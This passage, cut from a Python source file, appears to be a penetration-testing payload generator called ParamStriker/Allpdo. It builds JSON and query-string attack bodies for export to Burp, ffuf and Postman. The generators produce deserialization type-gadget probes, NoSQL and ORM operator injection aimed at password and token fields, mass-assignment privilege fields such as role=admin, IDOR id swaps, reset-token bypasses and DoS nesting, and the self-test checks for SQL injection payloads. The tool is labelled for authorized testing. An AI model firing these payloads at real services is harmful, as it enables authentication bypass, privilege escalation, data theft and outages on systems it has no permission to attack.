            impact="Pre-CVE-2019-12384-style polymorphic deserialization gadget",
            parser_targets=["Jackson"], risk=Risk.CRITICAL,
            tags=["serialization", "jackson", "polymorphic"])
        if p: yield p
        # @type variant
        obj = JsonEngine.replace_field(ctx.orig, f,
                {"@type": "java.util.HashMap", "v": ctx.orig[f]})
        p = self.mk("jackson_at_type",
            f"Jackson @type polymorphic tag on {f}", f, obj,
            parser_targets=["Jackson"], risk=Risk.HIGH,
            tags=["serialization", "jackson"])
        if p: yield p

    def _fastjson(self, ctx: GeneratorContext) -> Iterator[Payload]:
        if not ctx.orig: return
        f = next(iter(ctx.orig))
        obj = JsonEngine.replace_field(ctx.orig, f, {"@type": "java.util.HashMap"})
        p = self.mk("fastjson_type",
            f"FastJSON @type gadget probe on {f}", f, obj,
            impact="FastJSON autoType deserialization gadget surface",
            parser_targets=["FastJSON"], risk=Risk.CRITICAL,
            tags=["serialization", "fastjson"])
        if p: yield p

    def _gson(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f in ctx.orig:
            obj = JsonEngine.replace_field(ctx.orig, f, [1, 2, 3])
            p = self.mk("gson_array_to_object",
                f"Gson array→object coerce on {f}", f, obj,
                expected="Gson coerces single-element arrays to scalars when bound to "
                         "non-list Java field",
                parser_targets=["Gson"], risk=Risk.MEDIUM,
                tags=["serialization", "gson"])
            if p: yield p

    def _newtonsoft(self, ctx: GeneratorContext) -> Iterator[Payload]:
        if not ctx.orig: return
        f = next(iter(ctx.orig))
        obj = JsonEngine.replace_field(ctx.orig, f,
                {"$type": "System.Collections.Generic.Dictionary"
                 "`2[[System.String, mscorlib],[System.Object, mscorlib]], mscorlib"})
        p = self.mk("newtonsoft_dollar_type",
            f"Newtonsoft.Json $type gadget probe on {f}", f, obj,
            impact="TypeNameHandling=All deserialization sink",
            parser_targets=["Newtonsoft.Json"], risk=Risk.CRITICAL,
            tags=["serialization", "newtonsoft"])
        if p: yield p

    def _python_orjson(self, ctx: GeneratorContext) -> Iterator[Payload]:
        # orjson rejects subclassed dicts by default; ujson is laxer.
        for f in ctx.orig:
            obj = JsonEngine.replace_field(ctx.orig, f, float("nan") if False else "NaN")
            p = self.mk("py_nan_string",
                f"NaN as string on {f}", f, obj,
                expected="orjson serializes NaN as null by default; "
                         "ujson accepts; json with allow_nan=True emits NaN",
                parser_targets=["orjson", "ujson", "json"], risk=Risk.LOW,
                tags=["serialization", "python"])
            if p: yield p

    def _go(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f in ctx.orig:
            obj = JsonEngine.replace_field(ctx.orig, f, None)
            p = self.mk("go_null_zero",
                f"Null on {f} (Go zero-value coercion)", f, obj,
                expected="encoding/json sets zero-value when binding null to scalar",
                parser_targets=["encoding/json"], risk=Risk.LOW,
                tags=["serialization", "go"])
            if p: yield p

    def _prisma(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f in ctx.orig:
            obj = JsonEngine.replace_field(ctx.orig, f,
                    {"contains": "", "mode": "insensitive"})
            p = self.mk("prisma_contains",
                f"Prisma operator object on {f}", f, obj,
                expected="If validator passes raw, Prisma turns this into a LIKE search",
                parser_targets=["Prisma"], risk=Risk.MEDIUM,
                tags=["serialization", "prisma"])
            if p: yield p
            obj = JsonEngine.replace_field(ctx.orig, f, {"not": None})
            p = self.mk("prisma_not",
                f"Prisma 'not: null' on {f}", f, obj,
                parser_targets=["Prisma"], risk=Risk.MEDIUM,
                tags=["serialization", "prisma"])
            if p: yield p

    def _sequelize(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f in ctx.orig:
            for op in ("$ne", "$gt", "$gte", "$lt", "$lte", "$like", "$iLike",
                       "$regexp", "$or", "$and", "$between"):
                if op == "$between":
                    val: Any = [0, 999999]
                elif op in ("$or", "$and"):
                    val = [{f: 1}]
                else:
                    val = ""
                obj = JsonEngine.replace_field(ctx.orig, f, {op: val})
                p = self.mk("sequelize_op",
                    f"Sequelize {op} on {f}", f, obj,
                    parser_targets=["Sequelize"], risk=Risk.MEDIUM,
                    tags=["serialization", "sequelize", op])
                if p: yield p

    def _mongoose(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f in ctx.orig:
            for op, (val, why) in NOSQL_OPERATORS.items():
                obj = JsonEngine.replace_field(ctx.orig, f, {op: val})
                p = self.mk("mongoose_op",
                    f"Mongoose {op} on {f} ({why})", f, obj,
                    parser_targets=["Mongoose"], risk=Risk.HIGH,
                    tags=["serialization", "mongoose", op])
                if p: yield p

    def _typeorm(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f in ctx.orig:
            for op, val in [("$not", 0), ("$in", [1, 2, 3]),
                            ("$any", [1]), ("$raw", "1=1")]:
                obj = JsonEngine.replace_field(ctx.orig, f, {op: val})
                p = self.mk("typeorm_op",
                    f"TypeORM {op} on {f}", f, obj,
                    parser_targets=["TypeORM"], risk=Risk.HIGH,
                    tags=["serialization", "typeorm", op])
                if p: yield p


# ──────────────────────────────────────────────────────────────────────────
# 7.9  NoSqlGenerator
# ──────────────────────────────────────────────────────────────────────────

@register
class NoSqlGenerator(BaseGenerator):
    NAME      = "nosql"
    CATEGORY  = "NOSQL"
    ORDER     = 260
    MUTATION  = MutationType.NOSQL_OPERATOR
    RISK_BIAS = Risk.HIGH

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for f in ctx.orig:
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            for op, (val, why) in NOSQL_OPERATORS.items():
                obj = JsonEngine.replace_field(ctx.orig, f, {op: val})
                risk = Risk.CRITICAL if (ft in (FieldType.PASSWORD, FieldType.TOKEN)
                                          and op in ("$ne", "$gt", "$regex")) else Risk.HIGH
                p = self.mk("op_on_field",
                    f"NoSQL {op} on {f}: {why}", f, obj,
                    expected=f"MongoDB applies {op} predicate against `{f}`",
                    impact="Auth/data-access bypass on Mongo-backed endpoints",
                    parser_targets=["MongoDB", "Mongoose", "DocumentDB"],
                    risk=risk, tags=["nosql", op], field_type=ft)
                if p: yield p
        # Document-level operator smuggle
        for op in ("$where", "$or", "$and", "$expr"):
            obj = JsonEngine.deep_copy(ctx.orig)
            if op == "$where":
                obj[op] = "this.user!=null"
            elif op == "$expr":
                obj[op] = {"$eq": [1, 1]}
            else:
                obj[op] = [{k: v} for k, v in ctx.orig.items()]
            p = self.mk("doc_level_op",
                f"Document-level {op} smuggle", "*", obj,
                risk=Risk.HIGH, tags=["nosql", "doc_level", op])
            if p: yield p


# ──────────────────────────────────────────────────────────────────────────
# 7.10  MassAssignmentGenerator
# ──────────────────────────────────────────────────────────────────────────

@register
class MassAssignmentGenerator(BaseGenerator):
    NAME      = "mass_assignment"
    CATEGORY  = "MASS_ASSIGNMENT"
    ORDER     = 270
    MUTATION  = MutationType.MASS_ASSIGNMENT
    RISK_BIAS = Risk.HIGH

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        for k, v in PRIVILEGE_FIELDS.items():
            if k in ctx.orig: continue
            obj = JsonEngine.inject_sibling(ctx.orig, k, v)
            p = self.mk("inject_privilege_field",
                f"Inject privilege field {k!r}={v!r}", k, obj,
                expected="Backend ORM may blindly copy unknown fields onto the model",
                impact="Privilege escalation",
                risk=Risk.CRITICAL if k in {"role", "is_admin", "isAdmin",
                                            "admin", "permissions", "is_superuser"}
                                  else Risk.HIGH,
                tags=["mass_assignment", k])
            if p: yield p
        # Nested forms
        nested = {"user": {"role": "admin", "is_admin": True}}
        obj = JsonEngine.inject_sibling(ctx.orig, "user", nested["user"])
        p = self.mk("inject_user_block", "Inject nested 'user' privilege block",
                   "user", obj, risk=Risk.HIGH, tags=["mass_assignment", "nested"])
        if p: yield p


# ──────────────────────────────────────────────────────────────────────────
# 7.11  AuthLogicGenerator
# ──────────────────────────────────────────────────────────────────────────

@register
class AuthLogicGenerator(BaseGenerator):
    NAME      = "auth_logic"
    CATEGORY  = "AUTH_LOGIC"
    ORDER     = 280
    MUTATION  = MutationType.AUTH_BYPASS
    RISK_BIAS = Risk.HIGH

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        # IDOR — direct id swap
        for f, v in ctx.orig.items():
            ft = ctx.field_types.get(f, FieldType.UNKNOWN)
            if ft not in (FieldType.ID, FieldType.UUID, FieldType.INTEGER):
                continue
            for tv in [1, 0, -1, 2, 999999, "1", "admin", None, [1], {"$ne": v}]:
                obj = JsonEngine.replace_field(ctx.orig, f, tv)
                p = self.mk("idor",
                    f"IDOR probe {f}={tv!r}", f, obj,
                    impact="Access other users' resources",
                    risk=Risk.HIGH, tags=["auth", "idor"], field_type=ft)
                if p: yield p
        # Password reset chained probes
        for tf in ("token", "reset_token", "code"):
            body = JsonEngine.deep_copy(ctx.orig)
            body[tf] = ""
            p = self.mk("reset_empty_token",
                f"Empty {tf} on reset endpoint", tf, body,
                impact="Some compare-stub backends treat '' as wildcard",
                risk=Risk.HIGH, tags=["auth", "reset"])
            if p: yield p
        # Filter / sort / pagination bypass
        for k, v in [("limit", 999999), ("page", -1), ("page_size", 0),
                     ("offset", -1), ("order", "1=1"), ("filter", "*"),
                     ("sort", {"password": "ASC"})]:
            obj = JsonEngine.inject_sibling(ctx.orig, k, v)
            p = self.mk("filter_pagination",
                f"Inject {k}={v!r}", k, obj,
                risk=Risk.MEDIUM, tags=["auth", "filter"])
            if p: yield p


# ──────────────────────────────────────────────────────────────────────────
# 7.12  DoSGenerator  (safe-mode disables)
# ──────────────────────────────────────────────────────────────────────────

@register
class DoSGenerator(BaseGenerator):
    NAME      = "dos"
    CATEGORY  = "DOS"
    ORDER     = 290
    MUTATION  = MutationType.DOS
    RISK_BIAS = Risk.HIGH
    SAFE_GATE = True

    def generate(self, ctx: GeneratorContext) -> Iterator[Payload]:
        if ctx.safe_mode:
            return
        # Deep nesting (capped at MAX_NESTING_DEPTH)
        for depth in (50, 100, 250, 500):
            depth = min(depth, MAX_NESTING_DEPTH)
            obj: Any = 1
            for _ in range(depth):
                obj = {"x": obj}
            p = self.mk("deep_nesting", f"{depth}-deep nesting", "*", obj,
                       impact="Stack overflow in naive recursive parsers",
                       risk=Risk.HIGH, tags=["dos", "nesting"])
            if p: yield p
        # Wide object
        wide = {f"k{i}": i for i in range(2000)}
        p = self.mk("wide_object", "2000-key object", "*", wide,
                   risk=Risk.MEDIUM, tags=["dos", "wide"])
        if p: yield p
        # Huge string
        huge = "A" * 65536
        p = self.mk("huge_string", "64 KiB string", "*", {"s": huge},
                   risk=Risk.MEDIUM, tags=["dos", "huge_string"])
        if p: yield p


# ════════════════════════════════════════════════════════════════════════════
# 8.  FuzzingOrchestrator
# ════════════════════════════════════════════════════════════════════════════

@dataclass
class GenerationStats:
    generated: int = 0
    deduplicated: int = 0
    skipped_oversize: int = 0
    by_category: Dict[str, int] = field(default_factory=dict)
    by_risk:     Dict[str, int] = field(default_factory=dict)
    by_mutation: Dict[str, int] = field(default_factory=dict)
    by_generator: Dict[str, int] = field(default_factory=dict)
    elapsed_seconds: float = 0.0


class FuzzingOrchestrator:
    """Coordinates generators, dedups, and bookkeeping."""

    def __init__(self,
                 safe_mode: bool = True,
                 deep_mode: bool = False,
                 disabled_categories: Optional[Set[str]] = None,
                 only_categories:     Optional[Set[str]] = None,
                 targeted_fields:     Optional[Set[str]] = None,
                 max_payloads:        Optional[int] = None,
                 seed: int = DEFAULT_RNG_SEED) -> None:
        self.safe_mode = safe_mode
        self.deep_mode = deep_mode
        self.disabled  = set(disabled_categories or [])
        self.only      = set(only_categories or [])
        self.targeted  = set(targeted_fields or [])
        self.max       = max_payloads
        self.rng       = random.Random(seed)
        self.stats     = GenerationStats()

    def _generators(self) -> List[BaseGenerator]:
        chosen: List[BaseGenerator] = []
        for cls in sorted_generators():
            if cls.SAFE_GATE and self.safe_mode:
                continue
            if cls.DEEP_ONLY and not self.deep_mode:
                continue
            if self.only and cls.CATEGORY not in self.only:
                continue
            if cls.CATEGORY in self.disabled:
                continue
            chosen.append(cls())
        return chosen

    def generate(self, orig: Dict[str, Any]) -> List[Payload]:
        if not isinstance(orig, dict):
            raise ValueError("orig must be a JSON object (dict)")
        ctx = GeneratorContext(
            orig=orig,
            field_types=FieldAnalyzer.analyze(orig),
            safe_mode=self.safe_mode,
            deep_mode=self.deep_mode,
            targeted_fields=self.targeted or None,
            rng=self.rng,
        )
        start = time.time()
        seen: Set[str] = set()
        results: List[Payload] = []
        for gen in self._generators():
            try:
                produced = 0
                for p in gen.generate(ctx):
                    if p is None:
                        self.stats.skipped_oversize += 1
                        continue
                    fp = p.fingerprint()
                    if fp in seen:
                        self.stats.deduplicated += 1
                        continue
                    seen.add(fp)
                    results.append(p)
                    produced += 1
                    self.stats.generated += 1
                    self.stats.by_category[p.category] = self.stats.by_category.get(p.category, 0) + 1
                    self.stats.by_risk[p.risk.value]   = self.stats.by_risk.get(p.risk.value, 0) + 1
                    self.stats.by_mutation[p.mutation.value] = self.stats.by_mutation.get(p.mutation.value, 0) + 1
                    self.stats.by_generator[gen.NAME]  = self.stats.by_generator.get(gen.NAME, 0) + 1
                    if self.max is not None and len(results) >= self.max:
                        break
                    if produced >= MAX_PAYLOADS_PER_GEN:
                        break
                if self.max is not None and len(results) >= self.max:
                    break
            except Exception as e:
                # Surface the error but never crash the whole run
                sys.stderr.write(f"[!] Generator {gen.NAME} crashed: {e!r}\n")
        self.stats.elapsed_seconds = time.time() - start
        return results


# ════════════════════════════════════════════════════════════════════════════
# 9.  Exporters
# ════════════════════════════════════════════════════════════════════════════

class Exporter:
    """Multi-format writer. Every write_* method takes (path, payloads)."""

    @staticmethod
    def write_jsonl(path: str, payloads: List[Payload]) -> None:
        with open(path, "w", encoding="utf-8") as f:
            for p in payloads:
                f.write(p.to_jsonl() + "\n")

    @staticmethod
    def write_csv(path: str, payloads: List[Payload]) -> None:
        with open(path, "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f, quoting=csv.QUOTE_ALL, escapechar="\\",
                           lineterminator="\n")
            w.writerow(Payload.csv_header())
            for p in payloads:
                w.writerow(p.to_csv_row())

    @staticmethod
    def write_txt(path: str, payloads: List[Payload]) -> None:
        """One raw payload per line, for Burp Intruder."""
        with open(path, "w", encoding="utf-8") as f:
            for p in payloads:
                f.write(p.to_burp() + "\n")

    @staticmethod
    def write_burp(path: str, payloads: List[Payload]) -> None:
        Exporter.write_txt(path, payloads)

    @staticmethod
    def write_ffuf(path: str, payloads: List[Payload]) -> None:
        Exporter.write_txt(path, payloads)

    @staticmethod
    def write_md(path: str, payloads: List[Payload], stats: GenerationStats) -> None:
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"# Allpdo v{__version__} — Payload Report\n\n")
            f.write(f"_{SAFETY_NOTICE}_\n\n")
            f.write("## Summary\n\n")
            f.write(f"- Total payloads: **{stats.generated}**\n")
            f.write(f"- Deduplicated:   {stats.deduplicated}\n")
            f.write(f"- Oversize skipped: {stats.skipped_oversize}\n")
            f.write(f"- Elapsed: {stats.elapsed_seconds:.2f}s\n\n")
            f.write("### By category\n\n")
            for c, n in sorted(stats.by_category.items(),
                               key=lambda x: -x[1]):
                f.write(f"- `{c}` — {n}\n")
            f.write("\n### By risk\n\n")
            for r in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
                if r in stats.by_risk:
                    f.write(f"- `{r}` — {stats.by_risk[r]}\n")
            f.write("\n## Sample payloads (first 50 by category)\n\n")
            seen_cat: Dict[str, int] = {}
            for p in payloads:
                seen_cat[p.category] = seen_cat.get(p.category, 0)
                if seen_cat[p.category] >= 5:
                    continue
                seen_cat[p.category] += 1
                f.write(f"### {p.category} · {p.subcategory} · {p.field}\n")
                f.write(f"- **risk:** `{p.risk.value}` · **mutation:** "
                        f"`{p.mutation.value}` · **generator:** `{p.generator}`\n")
                f.write(f"- **description:** {p.description}\n")
                if p.expected: f.write(f"- **expected:** {p.expected}\n")
                if p.impact:   f.write(f"- **impact:** {p.impact}\n")
                f.write(f"\n```json\n{p.payload}\n```\n\n")

    @staticmethod
    def write_postman(path: str, payloads: List[Payload],
                      base_url: str = "https://example.test/api/endpoint") -> None:
        coll = {
            "info": {
                "name": f"Allpdo v{__version__} payloads",
                "_postman_id": hashlib.md5(str(time.time()).encode()).hexdigest(),
                "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
            },
            "item": [],
        }
        for p in payloads[:5000]:
            coll["item"].append({
                "name": f"{p.category}/{p.subcategory}/{p.field}",
                "request": {
                    "method": "POST",
                    "header": [
                        {"key": "Content-Type", "value": "application/json"},
                        {"key": "X-Allpdo-Category", "value": p.category},
                        {"key": "X-Allpdo-Risk",     "value": p.risk.value},
                    ],
                    "body": {"mode": "raw", "raw": p.payload},
                    "url":  base_url,
                    "description": p.description,
                },
            })
        with open(path, "w", encoding="utf-8") as f:
            json.dump(coll, f, ensure_ascii=False, indent=2)


# ════════════════════════════════════════════════════════════════════════════
# 10.  CLI
# ════════════════════════════════════════════════════════════════════════════

ASCII_BANNER = r"""
   ____                          ____  _        _ _
  |  _ \ __ _ _ __ __ _ _ __ ___/ ___|| |_ _ __(_) | _____ _ __
  | |_) / _` | '__/ _` | '_ ` _ \___ \| __| '__| | |/ / _ \ '__|
  |  __/ (_| | | | (_| | | | | |___) | |_| |  | |   <  __/ |
  |_|   \__,_|_|  \__,_|_| |_| |____/ \__|_|  |_|_|\_\___|_|

   ParamStriker v{ver}   ·   JSON & Query Parameter Fuzzing Framework
   by Mohnad Alshobaili   ·   X: @Mohnad
   offline  ·  authorized testing only
""".format(ver=__version__)


def _parse_input(json_arg: Optional[str], json_file: Optional[str]) -> Dict[str, Any]:
    if json_file:
        with open(json_file, "r", encoding="utf-8") as f:
            return json.load(f)
    if json_arg:
        return json.loads(json_arg)
    sys.stderr.write("[!] No input. Pass --json '<body>' or --json-file path.\n")
    sys.exit(2)


def cmd_list(_: argparse.Namespace) -> int:
    print(ASCII_BANNER)
    print("Registered generators (run order):\n")
    for cls in sorted_generators():
        print(f"  [{cls.ORDER:>3}] {cls.NAME:<22} {cls.CATEGORY:<24} "
              f"safe-gate={cls.SAFE_GATE} deep-only={cls.DEEP_ONLY}")
    return 0


def cmd_info(_: argparse.Namespace) -> int:
    print(ASCII_BANNER)
    print(f"Version:  {__version__}")
    print(f"Schema:   {__schema__}")
    print(f"Safety:   {SAFETY_NOTICE}")
    print(f"Caps:     max_nesting={MAX_NESTING_DEPTH} "
          f"max_payload_bytes={MAX_PAYLOAD_BYTES} "
          f"max_payloads_per_gen={MAX_PAYLOADS_PER_GEN}")
    return 0


def cmd_generate(args: argparse.Namespace) -> int:
    print(ASCII_BANNER)
    print(SAFETY_NOTICE + "\n")
    orig = _parse_input(args.json, args.json_file)

    only = set(args.only.split(",")) if args.only else None
    disabled = set(args.disable.split(",")) if args.disable else None
    targeted = set(args.fields.split(",")) if args.fields else None

    orch = FuzzingOrchestrator(
        safe_mode=not args.unsafe,
        deep_mode=args.deep,
        only_categories=only,
        disabled_categories=disabled,
        targeted_fields=targeted,
        max_payloads=args.limit,
        seed=args.seed,
    )
    payloads = orch.generate(orig)
    if args.search:
        rx = re.compile(args.search, re.I)
        payloads = [p for p in payloads if (rx.search(p.payload) or
                                            rx.search(p.description) or
                                            rx.search(p.category))]

    # report
    print(f"[+] Generated {orch.stats.generated} payloads "
          f"({orch.stats.deduplicated} deduped, "
          f"{orch.stats.skipped_oversize} oversized) "
          f"in {orch.stats.elapsed_seconds:.2f}s")
    if orch.stats.by_category:
        print("\nBy category:")
        for c, n in sorted(orch.stats.by_category.items(), key=lambda x: -x[1]):
            print(f"   {c:<22} {n}")
    if orch.stats.by_risk:
        print("\nBy risk:")
        for r in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
            if r in orch.stats.by_risk:
                print(f"   {r:<10} {orch.stats.by_risk[r]}")

    # exports
    base = args.out or "allpdo_v7_out"
    fmts = set((args.formats or "jsonl,csv,txt,md").split(","))
    if "jsonl" in fmts:
        Exporter.write_jsonl(base + ".jsonl", payloads)
        print(f"[+] Wrote {base}.jsonl")
    if "csv" in fmts:
        Exporter.write_csv(base + ".csv", payloads)
        print(f"[+] Wrote {base}.csv")
    if "txt" in fmts or "burp" in fmts:
        Exporter.write_txt(base + ".txt", payloads)
        print(f"[+] Wrote {base}.txt   (one payload per line — Burp / ffuf)")
    if "md" in fmts:
        Exporter.write_md(base + ".md", payloads, orch.stats)
        print(f"[+] Wrote {base}.md    (review report)")
    if "ffuf" in fmts:
        Exporter.write_ffuf(base + ".ffuf", payloads)
        print(f"[+] Wrote {base}.ffuf")
    if "postman" in fmts:
        Exporter.write_postman(base + ".postman_collection.json", payloads,
                               base_url=args.postman_url)
        print(f"[+] Wrote {base}.postman_collection.json")

    # head preview
    head = max(0, args.head)
    if head:
        print(f"\n── Preview ── first {head} payloads ──")
        for p in payloads[:head]:
            print(f"  [{p.category}/{p.subcategory}/{p.risk.value}] "
                  f"{p.field}: {p.payload[:140]}")
    return 0


# ════════════════════════════════════════════════════════════════════════════
# 11.  Self-test  (`python Allpdo_v7.py selftest`)
# ════════════════════════════════════════════════════════════════════════════

def cmd_selftest(_: argparse.Namespace) -> int:
    print(ASCII_BANNER)
    print("Running embedded self-test…\n")

    failures: List[str] = []

    def check(name: str, cond: bool, detail: str = "") -> None:
        mark = "OK " if cond else "FAIL"
        print(f"  [{mark}] {name}{(' — ' + detail) if detail else ''}")
        if not cond:
            failures.append(name)

    sample = {
        "email":    "alice@example.test",
        "password": "P@ssw0rd",
        "user_id":  1,
        "role":     "user",
        "token":    "abc123",
    }
    orch = FuzzingOrchestrator(safe_mode=True)
    payloads = orch.generate(sample)

    # 1) non-empty
    check("Generator produces payloads", len(payloads) > 0,
          f"{len(payloads)} payloads")

    # 2) PDO Sql leads
    leading = [p for p in payloads[:50]]
    check("PDO Sql payloads appear first",
          all(p.category == "PDO_SQL" for p in leading[:10]),
          f"first 10 categories: {[p.category for p in leading[:10]]}")

    # 3) PDO category present + has blog vectors
    pdo = [p for p in payloads if p.category == "PDO_PARSER"]
    check("PDO_PARSER generator emitted payloads", len(pdo) > 0,
          f"{len(pdo)} PDO payloads")
    check("PDO probes embedded inside JSON field values",
          any("?\\u0000" in p.payload and p.payload.startswith("{") for p in pdo))
    check("PDO SQLi (information_schema) injected as a JSON field value",
          any("information_schema.tables" in p.payload and p.payload.startswith("{") for p in pdo))
    check("PDO PostgreSQL UNION variant injected as a JSON field value",
          any("UNION SELECT" in p.payload and p.payload.startswith("{") for p in pdo))
    check("PDO pair_exploit family present (canonical Searchlight Cyber shape)",
          any(p.subcategory == "pair_exploit" for p in pdo))

    # 4) PDO Sql coverage — every scenario subcategory present
    expected_pdo_sql_subs = {
        "self_ref_object", "cross_column", "array_bypass", "token_bypass",
        "password_reset", "login_bypass", "two_factor_bypass",
        "session_confusion", "jwt_field", "api_key", "mass_select",
        "mass_update", "mass_delete", "mass_invite", "mass_share",
        "privilege_escalation", "tenant_escape", "org_escape",
        "workspace_escape", "chained_bypass", "bool_coercion",
        "sql_keyword_keys", "nested_variants", "empty_numeric_keys",
        "multi_key_object", "soft_delete_bypass", "coupon_abuse",
        "order_payment", "filter_bypass", "search_bypass", "order_by",
        "limit_offset", "in_clause", "comparison_confusion", "bulk_ops",
        "graphql_vars", "orm_operator", "prototype_combo",
        "mass_assignment_combo", "unicode_field", "toString_bypass",
        "negative_id", "expiry_window", "status_state",
    }
    present_subs = {p.subcategory for p in payloads if p.category == "PDO_SQL"}
    missing = expected_pdo_sql_subs - present_subs
    check("All expected PDO Sql scenarios present", not missing,
          f"missing: {sorted(missing)}" if missing else f"{len(present_subs)} subcats")

    # 5) Dedup works (idempotent fingerprint)
    fps = [p.fingerprint() for p in payloads]
    check("No duplicate fingerprints after dedup",
          len(fps) == len(set(fps)), f"{len(fps)} ids, {len(set(fps))} unique")

    # 6) Round-trip: every "structured" payload is valid JSON.
    # PARSER_DIFFERENTIAL and PDO_PARSER intentionally emit non-JSON to test
    # parser tolerance, so skip them — and skip any payload with a raw-byte tag.
    NON_JSON_CATEGORIES = {"PARSER_DIFFERENTIAL", "PDO_PARSER"}
    NON_JSON_TAGS = {"raw", "ready_to_paste", "literal_smuggle", "probe",
                     "identifier", "named_placeholder", "urlenc",
                     "raw_literal", "non_json"}
    bad = 0
    for p in payloads:
        if p.category in NON_JSON_CATEGORIES:
            continue
        if any(t in NON_JSON_TAGS for t in p.tags):
            continue
        if p.subcategory == "raw_number_literal":
            continue
        try:
            json.loads(p.payload)
        except Exception:
            bad += 1
            if bad < 5:
                print(f"     bad JSON: {p.category}/{p.subcategory}/{p.field}: "
                      f"{p.payload[:80]}")
    check("Structured payloads round-trip as JSON",
          bad == 0, f"{bad} non-parsable")

    # 7) Exporters
    tmpdir = "selftest_out"
    os.makedirs(tmpdir, exist_ok=True)
    Exporter.write_jsonl(os.path.join(tmpdir, "p.jsonl"), payloads)
    Exporter.write_csv  (os.path.join(tmpdir, "p.csv"),   payloads)
    Exporter.write_txt  (os.path.join(tmpdir, "p.txt"),   payloads)
    Exporter.write_md   (os.path.join(tmpdir, "p.md"),    payloads, orch.stats)
    check("Exporters produced files",
          all(os.path.exists(os.path.join(tmpdir, n))
              for n in ("p.jsonl", "p.csv", "p.txt", "p.md")))

    # 8) Determinism
    again = FuzzingOrchestrator(safe_mode=True).generate(sample)
    check("Deterministic across runs",
          [p.fingerprint() for p in payloads] == [p.fingerprint() for p in again])

    # 9) Safety: DoS payloads gated
    dos = [p for p in payloads if p.category == "DOS"]
    check("Safe mode disables DoS generator", len(dos) == 0)

    # 10) FieldAnalyzer sanity
    fa = FieldAnalyzer.analyze(sample)
    check("FieldAnalyzer classifies common fields",
          fa["email"] == FieldType.EMAIL
          and fa["password"] == FieldType.PASSWORD
          and fa["token"] == FieldType.TOKEN
          and fa["role"] == FieldType.ROLE
          and fa["user_id"] == FieldType.ID,
          f"fa={ {k:v.value for k,v in fa.items()} }")

    if failures:
        print(f"\n[FAIL] {len(failures)} checks failed: {failures}")
        return 1
    print(f"\n[PASS] All checks passed.  {len(payloads)} payloads generated.")
    return 0


# ════════════════════════════════════════════════════════════════════════════
# 12.  main()
# ════════════════════════════════════════════════════════════════════════════


# ════════════════════════════════════════════════════════════════════════════
#  Spinner — animated ASCII loader during long-running work
# ════════════════════════════════════════════════════════════════════════════

import threading as _threading

class Spinner:
    """Threaded ASCII spinner. Use as a context manager:

        with Spinner("Generating PDO Sql payloads"):
            work()

    Frames cycle through |  /  -  \\ at 80ms per frame.
    """
    FRAMES = ['|', '/', '-', '\\']

    def __init__(self, msg: str = "Working", interval: float = 0.08):
        self.msg = msg
        self.interval = interval
        self._stop = _threading.Event()
        self._t: Optional[_threading.Thread] = None
        self._tty = sys.stdout.isatty()

    def __enter__(self) -> "Spinner":
        if not self._tty:
            # No animation when piped — just print a single line
            sys.stdout.write(f"  ..  {self.msg}…\n")
            sys.stdout.flush()
            return self
        def _loop() -> None:
            i = 0
            while not self._stop.is_set():
                frame = self.FRAMES[i & 3]
                sys.stdout.write(f"\r  {frame}  {self.msg}…")
                sys.stdout.flush()
                time.sleep(self.interval)
                i += 1
        self._t = _threading.Thread(target=_loop, daemon=True)
        self._t.start()
        return self

    def __exit__(self, *exc: Any) -> None:
        self._stop.set()
        if self._t is not None:
            self._t.join()
        if self._tty:
            sys.stdout.write(f"\r  [+]  {self.msg} — done." + (" " * 30) + "\n")
            sys.stdout.flush()


# ════════════════════════════════════════════════════════════════════════════
#  GET-query helpers
# ════════════════════════════════════════════════════════════════════════════

def parse_query_string(qs: str) -> Dict[str, Any]:
    """Parse a query string like 'id=1&token=abc' into a dict the
    generators can consume. Repeated keys → lists. Numeric strings → ints.
    """
    from urllib.parse import parse_qs
    raw = parse_qs(qs.lstrip("?"), keep_blank_values=True)
    out: Dict[str, Any] = {}
    for k, vals in raw.items():
        if len(vals) == 1:
            v = vals[0]
            try:
                if v and v.lstrip("-").isdigit():
                    v = int(v)
            except (ValueError, TypeError):
                pass
            out[k] = v
        else:
            out[k] = vals
    return out


def json_to_php_query(obj: Any) -> str:
    """Encode a nested JSON object as a PHP-style URL-encoded query string:

        {"id": {"id": 1}}        →  id%5Bid%5D=1
        {"x": [1, 2]}            →  x%5B%5D=1&x%5B%5D=2
        {"k": null}              →  k=
        {"a": "b", "c": True}    →  a=b&c=true
    """
    from urllib.parse import quote
    parts: List[str] = []
    def emit(name: str, val: Any) -> None:
        if isinstance(val, dict):
            if not val:
                parts.append(f"{quote(name, safe='')}=")
                return
            for k, v in val.items():
                emit(f"{name}[{k}]", v)
        elif isinstance(val, list):
            if not val:
                parts.append(f"{quote(name, safe='')}=")
                return
            for v in val:
                emit(f"{name}[]", v)
        else:
            if val is None:
                rendered = ""
            elif isinstance(val, bool):
                rendered = "true" if val else "false"
            else:
                rendered = str(val)
            parts.append(f"{quote(name, safe='')}={quote(rendered, safe='')}")
    if isinstance(obj, dict):
        for k, v in obj.items():
            emit(str(k), v)
    else:
        emit("value", obj)
    return "&".join(parts)


def transform_payloads_to_query(payloads: List[Payload]) -> List[Payload]:
    """Re-render every structured (JSON) payload as a PHP-style query string.
    Non-JSON payloads (PDO raw bytes, parser-differential) pass through."""
    out: List[Payload] = []
    for p in payloads:
        try:
            obj = json.loads(p.payload)
        except Exception:
            out.append(p)
            continue
        new_body = json_to_php_query(obj)
        out.append(Payload(
            category=p.category, subcategory=p.subcategory,
            description=p.description + " [as GET query]",
            field=p.field, mutation=p.mutation, payload=new_body,
            expected=p.expected, impact=p.impact,
            parser_targets=p.parser_targets,
            backend_targets=p.backend_targets,
            risk=p.risk, tags=p.tags + ["query_form"],
            field_type=p.field_type, generator=p.generator,
        ))
    return out


# ════════════════════════════════════════════════════════════════════════════
